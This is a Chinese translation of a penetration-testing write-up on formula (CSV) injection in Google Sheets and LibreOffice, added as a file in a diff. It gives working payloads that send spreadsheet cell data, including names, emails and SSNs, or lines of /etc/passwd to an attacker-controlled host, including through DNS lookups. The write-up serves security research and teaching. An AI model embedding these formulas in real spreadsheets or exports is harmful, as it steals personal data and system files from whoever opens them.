@@ -1,0 +1,216 @@
+**最近的客户端渗透测试，让我们对使用带外数据（OOB）从电子表格窃取数据的方法颇感兴趣。在本文中我们假设，我们对电子表格有一定的控制权限（虽然有限），而对整个文档或客户端（目标）系统几乎没有任何的访问权限。**
+
+我们粗略的了解了下LibreOffice和Google
+Sheets，并为它们分别提供了一些PoC。我们特别关注非基于Windows的应用程序，因为在这一领域我们已经做了大量的工作，并且为此积攒了大量的实操经验。
+
+在这篇文章中，我们概述了来自NotSoSecure团队的Ajay
+([@9r4shar4j4y](https://twitter.com/9r4shar4j4y)) 和 Balaji
+([@iambalaji7](https://twitter.com/iambalaji7))所进行的研究。以下PoC可能允许我们使用相对简单的内置功能来窃取潜在的敏感信息，甚至可以在各个客户端系统上读取文件内容。
+
+好了话不多说，让我们开始吧~
+
+## Google Sheets OOB数据窃取
+
+如果我们想要获取实时数据，那么基于云的数据捕获将会是最好的选择。这是因为与基于客户端的攻击不同，我们能够快速连续地在表单中填充数据并实时的接收响应。
+
+攻击场景可能会有很大不同，这取决于你能得到什么。如果你能够创建/上传CSV文件或类似的其他文件到目标系统上，那么你成功利用的几率就会越大。
+
+首先，让我来为大家介绍一些非常有意思的功能。
+
+ **CONCATENATE：** 追加字符串。
+
+    
+    
+    =CONCATENATE(A2:E2)
+
+ **IMPORTXML：** 从各种结构化数据类型（包括XML，HTML，CSV，TSV以及RSS和ATOM XML Feed）导入数据。
+
+    
+    
+    =IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
+
+ **IMPORTFEED：** 导入RSS或ATOM feed。
+
+    
+    
+    =IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
+
+ **IMPORTHTML：** 从HTML页面中的表或列表导入数据。
+
+    
+    
+    =IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
+
+ **IMPORTRANGE：** 从指定的电子表格导入一系列单元格。
+
+    
+    
+    =IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
+
+ **IMAGE：** 将图像插入单元格。
+
+    
+    
+    =IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
+
+## 数据窃取
+
+基于Google文档的电子表格功能，即上述功能可能成为带外数据窃取的最佳途径和选择。
+
+ **场景1 [失败]：**
+这是一个失败的PoC演示，之所以包括这部分是希望大家能够从我们的失败经历中，学习到更多的知识。只有经历过失败，才会更觉成功的甜蜜。
+
+Google提供了创建表单和接收响应的功能，后续我们可以使用Google
+sheets访问这些功能。我们试图通过在Google表单的评论部分提交恶意公式来进行利用。但Google对提交的响应进行了完整性检查，并自动在公式前添加（'）撇号，阻止公式执行。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282455789307.png!small)
+
+ **场景2 [成功]：** Google
+sheets还提供了一些功能，允许我们从不同的文件格式导入数据，如CSV、TSV、XLSX等。导入的数据可以使用新电子表格来表示，也可以附加到现有表单中。对于我们的PoC，我们会将其附加到包含前一场景响应的表单中，以便我们可以提取其他用户提交的数据。幸运的是，Google没有像在场景1中那样，执行相同的检查。使用了以下步骤。
+
+1）我们创建了一个带有payload（公式）的恶意csv文件，该文件将连接A到D列的数据。 然后，我们使用这些详细信息为攻击者服务器生成带外请求。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282455977891.png!small)
+
+2）然后，我们使用导入功能将csv文件导入Google表格，并将数据附加到现有工作表中。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/1528245613978.png!small)
+
+3）一旦导入数据，我们的payload就会执行，我们就可以在HTTP服务器上收听用户的详细信息，例如姓名，电子邮件和SSN数据。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282456337002.png!small)
+
+## 在Linux环境中读取LibreOffice OS文件
+
+本节重点介绍如何在Linux环境中利用CSV注入。许多博客已经发布了PoC和其他类似的工具，这些工具涉及利用Excel中的DDE，但很少涉及Linux环境中的办公应用程序。这是可以理解的，因为Linux桌面普及程度远远低于Windows同类产品，而且我们知道，攻击者总会把目光瞄向最广泛和最有利可图的地方。
+
+在本文中我们会使用一些简单的，但非常有趣的可以在Linux目标上利用的攻击公式。
+
+payload已在下列环境中成功测试：
+
+> Ubuntu 16.04 LTS and LibreOffice 5.1.6.2
+>
+> Ubuntu 18.04 LTS and LibreOffice 6.0.3.2
+
+我们首先尝试使用我们的本地访问通过公式读取敏感文件。
+LibreOffice提供使用“file”协议读取文件。从本地/etc/passwd文件中检索单行的初始PoC已创建，并在下面详细介绍。
+
+ **Payload 1:**
+
+    
+    
+    ='file:///etc/passwd'#$passwd.A1
+
+**![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282456571770.png!small)**
+
+ **分析上述payload：**
+
+  * ‘file:///etc/passwd’#$passwd.A1 - 将读取本地/etc/passwd文件中第一行的内容。
+
+有趣的是，似乎还可以使用http://代替 file:///
+
+需要注意的是，在初次导入时，系统会提示用户执行如下截图所示的操作（在本例中显示/etc/group的输出）。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282456933975.png!small)
+
+导入后，每当文档重新打开时，都会提示用户更新链接。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282457121214.png!small)
+
+顺便提一下，通过更改行参考（在本例中为A2），我们可以从文件中读取更多条目。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282457302159.png!small)
+
+这一切都很顺利，但我们需要一种方法来查看来自远程系统的文件内容（我们不会在LibreOffice应用程序中查看这些结果！）
+
+这导致我们需要查看WEBSERVICE功能。实质上，我们可以使用此函数连接到我们控制的远程系统，然后发送对从本地/etc/passwd文件中提取的数据的请求。显然，这些文件不会存在于攻击主机上，但GET请求将包含所有的信息，并且可以通过攻击主机上的日志或控制台输出。
+
+为此，我们构造出了以下PoC。
+
+ **Payload 2:**  
+
+    
+    
+    =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)))
+
+**![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282457792859.png!small)**
+
+ **分析上述payload：**
+
+> ‘file:///etc/passwd’#$passwd.A1 - 将读取本地/etc/passwd文件中第一行的内容
+>
+> CONCATENATE(“http://<ip>:8080”,(‘file:///etc/passwd’#$passwd.A1)) -> 连接IP地址并输出'file'
+>
+> WEBSERVICE - 将向我们的攻击主机发送针对给定URI的请求
+
+我们的攻击系统运行了Python的SimpleHTTPServer，当恶意文件在受害者系统上打开时，请求就会被我们的服务器接收并接收。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282457993423.png!small)
+
+同样，我们创建了几个paylaod来读取目标文件。如果空间不是问题，只需确保最后一个引用（即＃$passwd.A1）设置为每行增加一行，就可以通过在单个文档中嵌入多行来轻松实现此任务。以下PoC将提取并发送目标文件/etc/passwd中的前30行。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282458191506.png!small)
+
+但是，实现相同目标的更简洁的方法是在单个公式中引用多行，如下所示。
+
+在执行下面的payload时，来自/etc/passwd文件的2行被发送到攻击服务器。
+
+ **Payload 3:**
+
+    
+    
+    =WEBSERVICE(CONCATENATE("http://<ip>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))
+
+**![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282458426641.png!small)**
+
+ **分析上述payload：**
+
+> ‘file:///etc/passwd’#$passwd.AX – 将读取本地/etc/passwd文件中第一行和第二行的内容
+>
+>
+> CONCATENATE(“http://<ip>:8080/”,(‘file:///etc/passwd’#$passwd.A1)&CHAR(36)&(‘file:///etc/passwd’#$passwd.A2))
+> – 将攻击服务器IP地址与/etc/passwd第1行和第2行（文件中的第2行）的输出连接起来，每个行都用dollar($)符
+>
+> WEBSERVICE – 将向我们的攻击主机发送针对给定URI的请求
+
+查看攻击主机，我们可以在GET请求中看到/etc/passwd中的相应条目，在这个实例中由$字符（CHAR 36）分隔。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282458624048.png!small)
+
+根据文件内容的不同，我们可能会遇到有关长度（<https://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url-in-different-browsers>）和特殊字符导致失败的情况，因此在这方面一定要引起注意！
+
+在下面的这个PoC中，我们很好的解决了上面提到的这两个问题。
+
+ **Payload 4:**
+
+    
+    
+    =WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<FQDN>"))
+
+**![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282458814464.png!small)**
+
+ **分析上述payload：**
+
+> ‘file：///etc/passwd’#$passwd.A19 – 将从本地/ etc / passwd文件中读取第19行
+>
+> ENCODEURL（’file：///etc/passwd’#$passwd.A19） – 对返回的数据进行URL编码
+>
+> MID（（ENCODEURL（’file：///etc/passwd’#$passwd.A19）），1,41） –
+> 与子字符串类似，从第1个字符读取数据到第41个字符 –
+> 一种非常方便的方式来限制DNS的长度主机名（FQDN上的254个字符限制和一个标签的63个字符，即子域）
+>
+> SUBSTITUTE（MID（（ENCODEURL（’file：///etc/passwd’#$passwd.A19）），1,41），“％”，“ –
+> ”） – 替换％（URL中的特殊字符编码）与破折号 – 这是确保只有有效的DNS字符被使用
+>
+>
+> CONCATENATE（（SUBSTITUTE（MID（（ENCODEURL（’文件：///etc/passwd’#$passwd.A19）），1,41），”％”，”
+> – ‘）），’。<FQDN>”） – 将文件的输出（经过上述处理后）与FQDN（我们可以访问域的权威主机）连接起来，
+>
+> WEBSERVICE – 将请求这个不存在的DNS名称，然后我们可以在我们控制的DNS权威名称服务器上解析日志（或运行tcpdump等）
+
+在发送此消息时，我们可以通过我们服务器上的tcpdump来查看FQDN（包括来自/etc/passwd的第19行的编码数据）的查询，该服务器被配置为该域的权威服务器，如下所示。
+
+![使用带外数据（OOB）从电子表格窃取数据](https://image.3001.net/images/20180606/15282459066752.png!small)
+
+ ***参考来源：[notsosecure](https://www.notsosecure.com/data-exfiltration-formula-injection/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**
+
